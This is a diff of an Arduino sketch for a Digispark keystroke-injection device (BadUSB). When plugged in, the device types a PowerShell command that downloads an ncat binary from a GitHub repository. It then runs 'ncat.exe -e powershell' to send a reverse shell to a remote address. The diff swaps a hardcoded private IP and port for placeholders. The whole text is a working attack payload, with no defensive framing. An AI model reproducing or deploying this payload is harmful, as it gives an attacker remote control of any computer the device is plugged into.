@@ -16,7 +16,7 @@ void setup() {
   DigiKeyboard.delay(300);  
   DigiKeyboard.println("powershell invoke-webrequest -uri https://github.com/nobodyatall648/ncatBinary/raw/main/ncat.exe -Outfile ncat.exe"); //download ncat binary from my git repo
   DigiKeyboard.delay(500);  
-  DigiKeyboard.println("ncat.exe -e powershell 192.168.0.159 18890"); //return reverse shell to 
+  DigiKeyboard.println("ncat.exe -e powershell <IP> <PORT>"); //return reverse shell to 
 }
 
 void loop() {
